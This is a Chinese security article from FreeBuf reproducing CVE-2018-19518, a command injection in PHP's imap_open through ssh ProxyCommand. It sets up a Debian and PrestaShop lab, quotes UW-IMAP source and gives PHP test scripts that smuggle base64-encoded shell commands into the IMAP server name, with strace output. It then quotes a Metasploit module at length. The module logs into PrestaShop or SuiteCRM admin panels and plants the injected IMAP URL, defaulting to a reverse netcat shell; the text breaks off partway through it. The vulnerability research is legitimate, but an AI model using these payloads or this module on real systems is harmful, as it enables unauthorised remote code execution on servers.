@@ -1,0 +1,848 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ***本文原创作者：不分手的恋爱，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+
+## 受影响版本  
+
+> Ubuntu <https://people.canonical.com/~ubuntu-> security/cve/2018/CVE-2018-19518.html>
+>
+> Debian <https://security-tracker.debian.org/tracker/CVE-2018-19518>
+>
+> Red Hat <https://access.redhat.com/security/cve/cve-2018-19518>
+>
+> SUSE <https://www.suse.com/security/cve/CVE-2018-19518/>
+
+## 描述
+
+PHP
+的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec
+受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。
+
+## 分析
+
+要利用此漏洞，攻击者必须具有对目标系统的用户级访问权限。此访问要求可以降低成功利用的可能性。
+
+## 复现过程
+
+### 环境搭建
+
+系统Debian9
+
+安装PHP及其他包（php7.0.30）
+
+    
+    
+    apt-get update && apt-get install -y nano php
+    
+
+我们需要对PHP做一些安全的配置
+
+比如说
+
+    
+    
+    echo ‘; priority=99’ > /etc/php/7.0/mods-available/disablefns.ini
+    echo ‘disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source’ >> /etc/php/7.0/mods-available/disablefns.ini
+    phpenmod disablefns
+    
+
+SSH安装
+
+    
+    
+    apt-get install -y ssh
+    
+
+strace工具安装
+
+    
+    
+    apt-get install -y strace
+    
+
+IMAP模块安装
+
+    
+    
+    cd /tmp/
+    wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg-2.dsc
+    wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg.orig.tar.gz
+    wget http://http.debian.net/debian/pool/main/u/uw-imap/uw-imap_2007f\~dfsg-2.debian.tar.gz
+    apt-get install dpkg-dev
+    dpkg-source -x uw-imap_2007f~dfsg-2.dsc imap-2007f
+    mv imap-2007f /usr/local/
+    
+
+### 什么是IMAP？
+
+为什么我们要先了解这个？因为IMAP是在系统中执行任何命令的桥梁。Internet消息访问协议（IMAP）是电子邮件客户端用于通过TCP /
+IP连接从邮件服务器检索电子邮件的Internet标准协议。IMAP由Mark
+Crispin于1986年设计为远程邮箱协议，与广泛使用的POP（一种用于检索邮箱内容的协议）形成对比。目前，IMAP由RFC
+3501定义规格。IMAP的设计目标是允许多个电子邮件客户端完全管理电子邮件收件箱。因此，客户端通常会在服务器上保留消息，直到用户明确删除它们为止。IMAP服务器通常侦听端口号143.默认情况下，为IMAP
+over
+SSL（IMAPS）分配端口号993。当然，PHP支持IMAP开箱即用。为了使协议的工作更容易，PHP有许多功能。在所有这些功能中，我们只对imap_open尽心讨论和探究。它用于打开邮箱的IMAP
+Stream。该函数不是PHP核心函数; 它是从华盛顿大学开发的UW
+IMAP工具包环境导入的，该库的最新版本大约在7年前于2011年发布。也许，IMAP在PHP中是这样调用的,比如说
+
+    
+    
+    resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] )
+    
+
+使用mailbox参数来定义连接的服务器，比如说
+
+    
+    
+    {[host]}:[port][flags]}[mailbox_name]
+    
+
+IMAP允许您使用预先验证的ssh或rsh会话自动登录服务器。当您不需要使用该功能时使用的标志然后默认尝试使用该标志
+
+    
+    
+    cd /usr/local/imap-2007f/
+    
+    
+    
+    cat src/osdep/unix/tcp_unix.c：
+    
+
+可以看到tcp_aopen的工作原理及主要功能在tcp_unix.c被定义
+
+    
+    
+    / TCP/IP authenticated open
+      Accepts: host name
+               service name
+               returned user name buffer
+      Returns: TCP/IP stream if success else NIL
+     /
+    #define MAXARGV 20
+    ...
+    TCPSTREAM tcp_aopen (NETMBX mb,char service,char usrbuf)
+    {
+    
+
+我们看一下ssh和rsh的路径
+
+    
+    
+    #ifdef SSHPATH                  / ssh path defined yet? /
+      if (!sshpath) sshpath = cpystr (SSHPATH);
+    #endif
+    #ifdef RSHPATH                  / rsh path defined yet? /
+      if (!rshpath) rshpath = cpystr (RSHPATH);
+    #endif
+    
+
+可以看到，写到了如果没有定义SSHPATH，那么将尝试读取RSHPATH。其中部分代码将会帮你找到SSHPATH定义发生的位置代码示例如下：/imap-2007f/src/osdep/unix/env_unix.h：
+
+    
+    
+    / dorc() options /
+    #define SYSCONFIG "/etc/c-client.cf"
+    
+
+/imap-2007f/src/osdep/unix/env_unix.c：
+
+    
+    
+    / Process rc file
+      Accepts: file name
+               .mminit flag
+      Don't use this feature.
+     /
+    void dorc (char file,long flag)
+    {
+      int i;
+      char s,t,k,r,tmp[MAILTMPLEN],tmpx[MAILTMPLEN];
+      extern MAILSTREAM CREATEPROTO;
+      extern MAILSTREAM EMPTYPROTO;
+      DRIVER d;
+      FILE f;
+      if ((f = fopen (file ? file : SYSCONFIG,"r")) &&
+          (s = fgets (tmp,MAILTMPLEN,f)) && (t = strchr (s,'\n'))) do {
+        t++ = '\0';                / tie off line, find second space /
+        if ((k = strchr (s,' ')) && (k = strchr (++k,' '))) {
+          k++ = '\0';              / tie off two words /
+          if (!compare_cstring (s,"set keywords") && !userFlags[0]) {
+                                    / yes, get first keyword /
+            k = strtok_r (k,", ",&r);
+    
+              fs_give ((void ) &sharedHome);
+              sharedHome = cpystr (k);
+            }
+            else if (!compare_cstring (s,"set system-inbox")) {
+              fs_give ((void ) &sysInbox);
+              sysInbox = cpystr (k);
+            }
+            else if (!compare_cstring (s,"set mail-subdirectory")) {
+              fs_give ((void *) &mailsubdir);
+              mailsubdir = cpystr (k);
+            }
+            else if (!compare_cstring (s,"set from-widget"))
+              mail_parameters (NIL,SET_FROMWIDGET,
+                               compare_cstring (k,"header-only") ?
+                               VOIDT : NIL);
+    ^L
+            else if (!compare_cstring (s,"set rsh-command"))
+              mail_parameters (NIL,SET_RSHCOMMAND,(void ) k);
+            else if (!compare_cstring (s,"set rsh-path"))
+              mail_parameters (NIL,SET_RSHPATH,(void ) k);
+            else if (!compare_cstring (s,"set ssh-command"))
+              mail_parameters (NIL,SET_SSHCOMMAND,(void ) k);
+            else if (!compare_cstring (s,"set ssh-path"))
+              mail_parameters (NIL,SET_SSHPATH,(void ) k);
+            else if (!compare_cstring (s,"set tcp-open-timeout"))
+              mail_parameters (NIL,SET_OPENTIMEOUT,(void ) atol (k));
+            else if (!compare_cstring (s,"set tcp-read-timeout"))
+              mail_parameters (NIL,SET_READTIMEOUT,(void ) atol (k));
+            else if (!compare_cstring (s,"set tcp-write-timeout"))
+              mail_parameters (NIL,SET_WRITETIMEOUT,(void ) atol (k));
+            else if (!compare_cstring (s,"set rsh-timeout"))
+              mail_parameters (NIL,SET_RSHTIMEOUT,(void ) atol (k));
+    
+
+默认情况下它是空的，我们是无法控制它的，因为/etc目录没有写入权限。呐，我们跳转到RSHPATH。他在Makefile中。不同版本的发行版为其Makefile的路径都会不同。如果你不知道你的Makefile的路径，你可以在/usr/bin/rsh查看Makefile的路径。/imap-2007f/src/osdep/unix/Makefile:
+
+    
+    
+    bs3: # BSD/i386 3.0 or higher
+    …
+    RSHPATH=/usr/bin/rsh \
+    …
+    bsf: # FreeBSD
+    …
+    RSHPATH=/usr/bin/rsh \
+    …
+    mnt: # Mint
+    …
+    RSHPATH=/usr/bin/rsh \
+    …
+    osx: # Mac OS X
+    …
+    RSHPATH=/usr/bin/rsh \
+    …
+    slx: # Secure Linux
+    …
+    RSHPATH=/usr/bin/rsh \
+    
+
+我们cat一下tcp_appen返回都改变了什么
+
+    
+    
+    #endif
+      if (service == '') {        / want ssh? /
+                                    / return immediately if ssh disabled /
+        if (!(sshpath && (ti = sshtimeout))) return NIL;
+                                    / ssh command prototype defined yet? /
+        if (!sshcommand) sshcommand = cpystr ("%s %s -l %s exec /usr/sbin/r%sd");
+      }
+                                    / want rsh? /
+      else if (rshpath && (ti = rshtimeout)) {
+                                    / rsh command prototype defined yet? /
+        if (!rshcommand) rshcommand = cpystr ("%s %s -l %s exec /usr/sbin/r%sd");
+      }
+      else return NIL;              / rsh disabled /
+                                    / look like domain literal? */
+    
+
+我们发现上述的代码示例生成一个命令，用于在远程服务器上执行rimapd二进制文件。让我们创建一个PHP脚本进行测试test1.php。
+
+    
+    
+    /tmp/test0001
+    $server = "x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}";
+    imap_open('{'.$server.':143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
+    
+
+Poc地址
+
+    
+    
+    https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php
+    
+
+使用带有execve系统调用过滤的strace工具来观察脚本处理期间将执行的命令。
+
+    
+    
+    strace -f -e trace=clone, execve php test1.php
+    
+
+如回显，这里的x其实是执行命令的参数之一，这意味着我们可以在操作服务器地址参数时操纵命令行
+
+    
+    
+    [pid 17251] execve("/usr/bin/rsh", ["/usr/bin/rsh", "x", "-oProxyCommand=echo\tZWNobyAnMTIz"..., "-l", "root", "exec", "/usr/sbin/rimapd"], [/ 20 vars /] 
+    我们ssh的一个ProxyCommand，连接服务器的这样的一个命令具体说明如下
+    
+    
+    
+    ProxyCommand
+    指定用于连接服务器的命令。命令字符串扩展到行的末尾，并使用用户的shell' exec'指令执行，以避免延迟的shell进程。
+    ProxyCommand接受TOKENS 部分中描述的令牌的 参数。该命令基本上可以是任何东西，并且应该从其标准输入读取并写入其标准输出。它应该最终连接在某台机器上运行的sshd（8）服务器，或者在sshd -i某处执行。主机密钥管理将使用所连接主机的HostName完成（默认为用户键入的名称）。设置命令以none完全禁用此选项。请注意， CheckHostIP无法与代理命令连接。
+    该指令与nc（1）及其代理支持结合使用非常有用 。例如，以下指令将通过192.0.2.0的HTTP代理连接：
+    ProxyCommand / usr / bin / nc -X connect -x 192.0.2.0:8080% h％p
+    
+    
+    
+    ssh -oProxyCommand =“echo hello | tee / tmp / executed”localhost
+    
+
+命令成功执行，回显
+
+    
+    
+    root@hacker:/tmp# ssh -oProxyCommand="echo hello|tee /tmp/executed" localhost
+    ssh_exchange_identification: Connection closed by remote host
+    root@hacker:/tmp# cat /tmp/executed
+    hello
+    root@hacker:/tmp#
+    
+
+这时我们不能直接将它转移到PHP脚本来代替imap_open服务器地址，因为在解析时，它将空格解释为分隔符和斜杠作为标志。但，你可以使用$ IFS
+shell变量来替换空格符号或普通选项卡（\ t）。还可以在bash中使用Ctrl +
+V热键和Tab键插入标签。要想绕过斜杠，你可以使用base64编码和相关命令对其进行解码，比如
+
+    
+    
+    echo "echo hello|tee /tmp/executed"|base64
+    ehco ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash
+    
+    
+    
+    root@hacker:/tmp# echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash
+    hello
+    root@hacker:/tmp#
+    
+
+我们也可以也hack
+bar里对其用base64进行解码开个题外话，刚还在群里问了大佬们用的firefox的hackbar多一点还是chrome的hackbar多一点呢，因为我感觉firefox的hackbar更舒服，但是更喜欢用chrome，很纠结，还是看习惯吧
+呐，我们现在放到PHP进行测试 新建一个test2.php
+
+    
+    
+    <?php$payload = “echo hello|tee /tmp/executed”;$encoded_payload = base64_encode($payload);$server = “any -o ProxyCommand=echo\t”.$encoded_payload.”|base64\t-d|bash”;@imap_open(‘{‘.$server.’}:143/imap}INBOX’, ‘’, ‘’);
+    
+
+现在再次使用strace执行它并观察命令行调用的内容。
+
+    
+    
+    root@hacker:/tmp# strace -f -e trace=clone,execve php test2.phpexecve("/usr/bin/php", ["php", "test2.php"], [/ 20 vars /]) = 0strace: Process 17488 attachedstrace: Process 17489 attached[pid 17489] execve("/usr/bin/rsh", ["/usr/bin/rsh", "any", "-o", "ProxyCommand=echo\tZWNobyBoZWxsb3"..., "-l", "root", "exec", "/usr/sbin/rimapd"], [/ 20 vars /] <unfinished ...>[pid 17488] +++ exited with 1 +++[pid 17487] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17488, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---[pid 17489] <... execve resumed> )      = 0[pid 17489] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f84a6842650) = 17490strace: Process 17490 attached[pid 17490] execve("/bin/bash", ["/bin/bash", "-c", "exec echo\tZWNobyBoZWxsb3x0ZWUgL3"...], [/ 20 vars /]) = 0[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17491[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17492[pid 17490] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f302b766e10) = 17493strace: Process 17493 attachedstrace: Process 17492 attached[pid 17493] execve("/bin/bash", ["bash"], [/ 20 vars /]) = 0[pid 17492] execve("/usr/bin/base64", ["base64", "-d"], [/ 20 vars /]strace: Process 17491 attached) = 0[pid 17491] execve("/bin/echo", ["echo", "ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVj"...], [/ 20 vars /]) = 0[pid 17492] +++ exited with 0 +++[pid 17491] +++ exited with 0 +++[pid 17493] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f292e137e10) = 17494[pid 17493] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f292e137e10) = 17495strace: Process 17495 attached[pid 17495] execve("/usr/bin/tee", ["tee", "/tmp/executed"], [/ 20 vars /]) = 0strace: Process 17494 attached[pid 17494] +++ exited with 0 +++[pid 17495] +++ exited with 0 +++[pid 17493] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17494, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---[pid 17493] +++ exited with 0 +++[pid 17490] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17492, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---[pid 17490] +++ exited with 0 +++[pid 17489] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17490, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---[pid 17489] +++ exited with 255 +++PHP Notice:  Unknown: No such host as any -o ProxyCommand=echo ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZA==|base64 -d|bash (errflg=2) in Unknown on line 0+++ exited with 0 +++root@hacker:/tmp#
+    
+
+被我们用红色框圈出来的，它们都正在远程服务器上运行。利用完成，文件创建成功。这些命令不是由PHP本身执行，而是由外部库执行，这意味着什么？？意味着他们都不会阻止它执行，而不是事件disable_functions指令。现在我们放在简单的生产环境进行测试PrestaShop,PrestaShop是一种免费增值的开源电子商务解决方案,它是由php编写的，mysql数据库，官网给出的最低配置，我们简略的看一下
+
+    
+    
+    apt install -y wget unzip apache2 mysql-server php-zip php-curl php-mysql php-gd php-mbstringservice mysql startmysql -u root -e "CREATE DATABASE prestashop; GRANT ALL PRIVILEGES ON . TO 'root'@'localhost' IDENTIFIED BY 'megapass';"a2enmod rewrite
+    
+
+我们cd 到/var/www/html
+
+    
+    
+    wget [https://download.prestashop.com/download/releases/prestashop_1.7.4.4.zip](https://download.prestashop.com/download/releases/prestashop_1.7.4.4.zip)unzip prestashop_1.7.4.4.zip#Start Apache2 daemon and surf your web-server to begin shop installation.service apache2 start
+    
+
+访问192.168.169.128/install/index.php进行安装，并登陆管理面板我们也可以查看AdminCustomerThreads的源代码/prestashop-1.7.4.4/controllers/admin/AdminCustomerThreadsController.php
+
+    
+    
+    // Executes the IMAP synchronization.$sync_errors = $this->syncImap();…public function syncImap(){if (!($url = Configuration::get(‘PS_SAV_IMAP_URL’))|| !($port = Configuration::get(‘PS_SAV_IMAP_PORT’))|| !($user = Configuration::get(‘PS_SAV_IMAP_USER’))|| !($password = Configuration::get(‘PS_SAV_IMAP_PWD’))) {return array(‘hasError’ => true, ‘errors’ => array(‘IMAP configuration is not correct’));}$conf = Configuration::getMultiple(array(‘PS_SAV_IMAP_OPT_POP3’, ‘PS_SAV_IMAP_OPT_NORSH’, ‘PS_SAV_IMAP_OPT_SSL’,‘PS_SAV_IMAP_OPT_VALIDATE-CERT’, ‘PS_SAV_IMAP_OPT_NOVALIDATE-CERT’,‘PS_SAV_IMAP_OPT_TLS’, ‘PS_SAV_IMAP_OPT_NOTLS’));…$mbox = @imap_open(‘{‘.$url.’:’.$port.$conf_str.’}’, $user, $password);
+    
+
+在这里你可以看到imap_open调用的url变量现在我们执行paylaod.php
+
+    
+    
+    <？php $ payload = $ argv [1]; $ encoded_pa​​yload = base64_encode（$ payload）; $ server =“any -o ProxyCommand = echo \ t”。$ encoded_pa​​yload。“| base64 \ td | bash}”; print（“payload：{$ server}”。PHP_EOL）;
+    
+
+终于能看见远程执行了，好了复现就到这里管理员可以做点什么？
+
+    
+    
+    建议管理员应用适当的更新。建议管理员仅允许受信任的用户进行网络访问。建议管理员同时运行防火墙和防病毒应用程序，以最大限度地降低入站和出站威胁的可能性。管理员可以考虑使用基于IP的访问控制列表（ACL），仅允许受信任的系统访问受影响的系统。管理员可以使用可靠的防火墙策略帮助保护受影响的系统免受外部攻击。建议管理员监视受影响的系统。
+    
+
+大佬的帖子是这么写的，稍微搬一下，没怎么做翻译，说一下自己结合的理解，类似于PrestaShop这样的软件暂时没有更新版本解决这个安全问题。听说，PHP大佬已经发布了针对此问题的补丁，估计Linux发行版中的存储库和软件包也未必有这么快动作来更新安全补丁最后奉上CVE-2018-19518漏洞利用的。
+
+    
+    
+    ##
+    # This module requires Metasploit: https://metasploit.com/download
+    # Current source: https://github.com/rapid7/metasploit-framework
+    ##
+     
+    class MetasploitModule < Msf::Exploit::Remote
+      Rank = GoodRanking
+     
+      include Msf::Exploit::Remote::HttpClient
+     
+      def initialize(info = {})
+        super(update_info(info,
+          'Name'            => 'php imap_open Remote Code Execution',
+          'Description'     => %q{
+            The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an
+            IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand
+            option can be passed from imap_open to execute arbitrary commands.
+            While many custom applications may use imap_open, this exploit works against the following applications:
+            e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.
+            Prestashop exploitation requires the admin URI, and administrator credentials.
+            suiteCRM/e107/hostcms require administrator credentials.
+          },
+          'Author' =>
+            [
+              'Anton Lopanitsyn', # Vulnerability discovery and PoC
+              'Twoster', # Vulnerability discovery and PoC
+              'h00die' # Metasploit Module
+            ],
+          'License'         => MSF_LICENSE,
+          'References'      =>
+            [
+              [ 'URL', 'https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395' ],
+              [ 'URL', 'https://github.com/Bo0oM/PHP_imap_open_exploit' ],
+              [ 'EDB', '45865'],
+              [ 'URL', 'https://bugs.php.net/bug.php?id=76428'],
+              [ 'CVE', '2018-19518']
+            ],
+          'Privileged'  => false,
+          'Platform'  => [ 'unix' ],
+          'Arch'  => ARCH_CMD,
+          'Targets' =>
+            [
+              [ 'prestashop', {} ],
+              [ 'suitecrm', {}],
+              [ 'e107v2', {'WfsDelay' => 90}], # may need to wait for cron
+              [ 'custom', {'WfsDelay' => 300}]
+            ],
+          'PrependFork' => true,
+          'DefaultOptions' =>
+            {
+              'PAYLOAD' => 'cmd/unix/reverse_netcat',
+              'WfsDelay' => 120
+            },
+          'DefaultTarget'  => 0,
+          'DisclosureDate' => 'Oct 23 2018'))
+     
+        register_options(
+          [
+            OptString.new('TARGETURI', [ true, "Base directory path", '/admin2769gx8k3']),
+            OptString.new('USERNAME', [ false, "Username to authenticate with", '']),
+            OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
+          ])
+      end
+     
+      def check
+       if target.name =~ /prestashop/
+          uri = normalize_uri(target_uri.path)
+          res = send_request_cgi({'uri' => uri})
+          if res && (res.code == 301 || res.code == 302)
+           return CheckCode::Detected
+          end
+        elsif target.name =~ /suitecrm/
+          #login page GET /index.php?action=Login&module=Users
+          vprint_status('Loading login page')
+          res = send_request_cgi(
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'vars_get' => {
+              'action' => 'Login',
+              'module' => 'Users'
+            }
+          )
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+     
+          if res.code = 200
+            return CheckCode::Detected
+          end
+       end
+       CheckCode::Safe
+      end
+     
+      def command(spaces='$IFS$()')
+        #payload is base64 encoded, and stuffed into the SSH option.
+        enc_payload = Rex::Text.encode_base64(payload.encoded)
+        command = "-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`"
+        #final payload can not contain spaces, however $IFS$() will return the space we require
+        command.gsub!(' ', spaces)
+      end
+     
+      def exploit
+        if target.name =~ /prestashop/
+          uri = normalize_uri(target_uri.path)
+          res = send_request_cgi({'uri' => uri})
+          if res && res.code != 301
+            print_error('Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3')
+            return
+          end
+     
+          #There are a bunch of redirects that happen, so we automate going through them to get to the login page.
+          while res.code == 301 || res.code == 302
+            cookie = res.get_cookies
+            uri = res.headers['Location']
+            vprint_status("Redirected to #{uri}")
+            res = send_request_cgi({'uri' => uri})
+          end
+     
+          #Tokens are generated for each URL or sub-component, we need valid ones!
+          /.*token=(?<token>\w{32})/ =~ uri
+          /id="redirect" value="(?<redirect>.*)"\/>/ =~ res.body
+          cookie = res.get_cookies
+     
+          unless token && redirect
+            print_error('Unable to find token and redirect URL, check options.')
+            return
+          end
+     
+          vprint_status("Token: #{token} and Login Redirect: #{redirect}")
+          print_status("Logging in with #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+          res = send_request_cgi(
+            'method' => 'POST',
+            'uri'    => normalize_uri(target_uri.path, 'index.php'),
+            'cookie' => cookie,
+            'vars_post' => {
+              'ajax' => 1,
+              'token' => '',
+              'controller' => 'AdminLogin',
+              'submitLogin' => '1',
+              'passwd' => datastore['PASSWORD'],
+              'email' => datastore['USERNAME'],
+              'redirect' => redirect
+            },
+            'vars_get' => {
+              'rand' => '1542582364810' #not sure if this will hold true forever, I didn't see where it is being generated
+            }
+          )
+          if res && res.body.include?('Invalid password')
+            print_error('Invalid Login')
+            return
+          end
+          vprint_status("Login JSON Response: #{res.body}")
+          uri = JSON.parse(res.body)['redirect']
+          cookie = res.get_cookies
+          print_good('Login Success, loading admin dashboard to pull tokens')
+          res = send_request_cgi({'uri' => uri, 'cookie' => cookie})
+     
+          /AdminCustomerThreads&token=(?<token>\w{32})/ =~ res.body
+          vprint_status("Customer Threads Token: #{token}")
+          res = send_request_cgi({
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'cookie' => cookie,
+            'vars_get' => {
+              'controller' => 'AdminCustomerThreads',
+              'token' => token
+            }
+          })
+     
+          /form method="post" action="index\.php\?controller=AdminCustomerThreads&token=(?<token>\w{32})/ =~ res.body
+          print_good("Sending Payload with Final Token: #{token}")
+          data = Rex::MIME::Message.new
+          data.add_part('1', nil, nil, 'form-data; name="PS_CUSTOMER_SERVICE_FILE_UPLOAD"')
+          data.add_part("Dear Customer,\n\nRegards,\nCustomer service", nil, nil, 'form-data; name="PS_CUSTOMER_SERVICE_SIGNATURE_1"')
+          data.add_part("x #{command}}", nil, nil, 'form-data; name="PS_SAV_IMAP_URL"')
+          data.add_part('143', nil, nil, 'form-data; name="PS_SAV_IMAP_PORT"')
+          data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name="PS_SAV_IMAP_USER"')
+          data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name="PS_SAV_IMAP_PWD"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_DELETE_MSG"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_CREATE_THREADS"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_POP3"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_NORSH"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_SSL"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_VALIDATE-CERT"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_NOVALIDATE-CERT"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_TLS"')
+          data.add_part('0', nil, nil, 'form-data; name="PS_SAV_IMAP_OPT_NOTLS"')
+          data.add_part('', nil, nil, 'form-data; name="submitOptionscustomer_thread"')
+     
+          send_request_cgi(
+            'method' => 'POST',
+            'uri'    => normalize_uri(target_uri.path, 'index.php'),
+            'ctype'  => "multipart/form-data; boundary=#{data.bound}",
+            'data'   => data.to_s,
+            'cookie' => cookie,
+            'vars_get' => {
+              'controller' => 'AdminCustomerThreads',
+              'token' => token
+            }
+          )
+          print_status('IMAP server change left on server, manual revert required.')
+     
+          if res && res.body.include?('imap Is Not Installed On This Server')
+            print_error('PHP IMAP mod not installed/enabled ')
+          end
+        elsif target.name =~ /suitecrm/
+          #login page GET /index.php?action=Login&module=Users
+          vprint_status('Loading login page')
+          res = send_request_cgi(
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'vars_get' => {
+              'action' => 'Login',
+              'module' => 'Users'
+            }
+          )
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+     
+          if res.code = 200
+            cookie = res.get_cookies
+          else
+            print_error("HTTP code #{res.code} found, check options.")
+            return
+          end
+     
+          vprint_status("Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+          res = send_request_cgi(
+            'method' => 'POST',
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'cookie' => cookie,
+            'vars_post' => {
+              'module' => 'Users',
+              'action' => 'Authenticate',
+              'return_module' => 'Users',
+              'return_action' => 'Login',
+              'cant_login' => '',
+              'login_module' => '',
+              'login_action' => '',
+              'login_record' => '',
+              'login_token' => '',
+              'login_oauth_token' => '',
+              'login_mobile' => '',
+              'user_name' => datastore['USERNAME'],
+              'username_password' => datastore['PASSWORD'],
+              'Login' => 'Log+In'
+            }
+          )
+          unless res
+            print_error('Error loading site.  Check options.')
+            return
+          end
+     
+          if res.code = 302
+            cookie = res.get_cookies
+            print_good('Login Success')
+          else
+            print_error('Failed Login, check options.')
+          end
+     
+          #load the email settings page to get the group_id
+          vprint_status('Loading InboundEmail page')
+          res = send_request_cgi(
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'cookie' => cookie,
+            'vars_get' => {
+              'module' => 'InboundEmail',
+              'action' => 'EditView'
+            }
+          )
+     
+          unless res
+            print_error('Error loading site.')
+            return
+          end
+     
+          /"group_id" value="(?<group_id>\w{8}-\w{4}-\w{4}-\w{4}-\w{12})">/ =~ res.body
+     
+          unless group_id
+            print_error('Could not identify group_id from form page')
+            return
+          end
+     
+          print_good("Sending payload with group_id #{group_id}")
+     
+          referer = "http://#{datastore['RHOST']}#{normalize_uri(target_uri.path, 'index.php')}?module=InboundEmail&action=EditView"
+          res = send_request_cgi(
+            'method' => 'POST',
+            'uri' => normalize_uri(target_uri.path, 'index.php'),
+            'cookie' => cookie,
+            #required to prevent CSRF protection from triggering
+            'headers' => { 'Referer' => referer},
+            'vars_post' => {
+              'module' => 'InboundEmail',
+              'record' => '',
+              'origin_id' => '',
+              'isDuplicate' => 'false',
+              'action' => 'Save',
+              'group_id' => group_id,
+              'return_module' => '',
+              'return_action' => '',
+              'return_id' => '',
+              'personal' => '',
+              'searchField' => '',
+              'mailbox_type' => '',
+              'button' => '  Save  ',
+              'name' => Rex::Text.rand_text_alphanumeric(8),
+              'status' => 'Active',
+              'server_url' => "x #{command}}",
+              'email_user' => Rex::Text.rand_text_alphanumeric(8),
+              'protocol' => 'imap',
+              'email_password' => Rex::Text.rand_text_alphanumeric(8),
+              'port' => '143',
+              'mailbox' => 'INBOX',
+              'trashFolder' => 'TRASH',
+              'sentFolder' => '',
+              'from_name' => Rex::Text.rand_text_alphanumeric(8),
+              'is_auto_import' => 'on',
+              'from_addr' => "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org",
+              'reply_to_name' => '',
+              'distrib_method' => 'AOPDefault',
+              'distribution_user_name' => '',
+              'distribution_user_id' => '',
+              'distribution_options[0]' => 'all',
+              'distribution_options[1]' => '',
+              'distribution_options[2]' => '',
+              'create_case_template_id' => '',
+              'reply_to_addr' => '',
+              'template_id' => '',
+              'filter_domain' => '',
+              'email_num_autoreplies_24_hours' => '10',
+              'leaveMessagesOnMailServer' => '1'
+            }
+          )
+          if res && res.code == 200
+            print_error('Triggered CSRF protection, may try exploitation manually.')
+          end
+          print_status('IMAP server config left on server, manual removal required.')
+        elsif target.name =~ /e107v2/
